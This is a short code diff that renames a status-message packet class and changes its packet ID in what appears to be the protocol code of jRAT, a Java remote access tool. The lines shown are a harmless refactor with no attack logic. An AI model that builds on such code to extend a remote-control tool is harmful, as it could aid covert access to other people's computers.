@@ -5,11 +5,11 @@ import java.io.DataOutputStream;
 import se.jrat.common.io.StringWriter;
 
 
-public class Packet13Status extends AbstractOutgoingPacket {
+public class Packet2Status extends AbstractOutgoingPacket {
 
 	private String status;
 
-	public Packet13Status(String status) {
+	public Packet2Status(String status) {
 		this.status = status;
 	}
 
@@ -20,7 +20,7 @@ public class Packet13Status extends AbstractOutgoingPacket {
 
 	@Override
 	public byte getPacketId() {
-		return (byte) 13;
+		return (byte) 2;
 	}
 
 }
